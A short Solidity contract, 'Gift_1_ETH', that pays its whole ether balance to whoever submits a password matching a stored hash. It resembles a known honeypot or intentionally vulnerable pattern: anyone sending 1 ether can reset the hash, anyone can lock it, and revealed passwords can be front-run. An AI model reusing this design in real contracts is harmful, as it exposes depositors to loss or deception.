1 pragma solidity ^0.4.19;
2 
3 contract Gift_1_ETH
4 {
5     bool passHasBeenSet = false;
6     
7     function()payable{}
8     
9     function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
10     
11     bytes32 public hashPass;
12     
13     function SetPass(bytes32 hash)
14     public
15     payable
16     {
17         if(!passHasBeenSet&&(msg.value >= 1 ether))
18         {
19             hashPass = hash;
20         }
21     }
22     
23     function GetGift(bytes pass)
24     external
25     payable
26     {
27         if(hashPass == sha3(pass))
28         {
29             msg.sender.transfer(this.balance);
30         }
31     }
32     
33     function PassHasBeenSet(bytes32 hash)
34     public
35     {
36         if(hash==hashPass)
37         {
38            passHasBeenSet=true;
39         }
40     }
41 }